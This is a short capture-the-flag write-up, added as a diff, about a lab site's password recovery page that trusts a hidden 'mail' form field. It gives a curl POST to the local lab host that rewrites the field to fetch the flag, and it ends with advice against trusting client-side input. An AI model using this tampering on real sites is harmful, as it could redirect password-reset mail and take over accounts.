@@ -1,0 +1,13 @@
+In the page recover, the hidden input "mail" is present
+
+<input type="hidden" name="mail" value="webmaster@borntosec.com" maxlength="15">
+
+When we execute the form, we got a post request with two fields "mails" and "Submit".
+
+Let's try to change the mail field content!
+
+curl 'http://192.168.1.140:8080/?page=recover' --data-raw 'mail=hibou%40gmail.com&Submit=Submit' | grep flag
+
+We got the flag ;)
+
+Another time, don't trust user at all. Don't put backend logic into frontend.
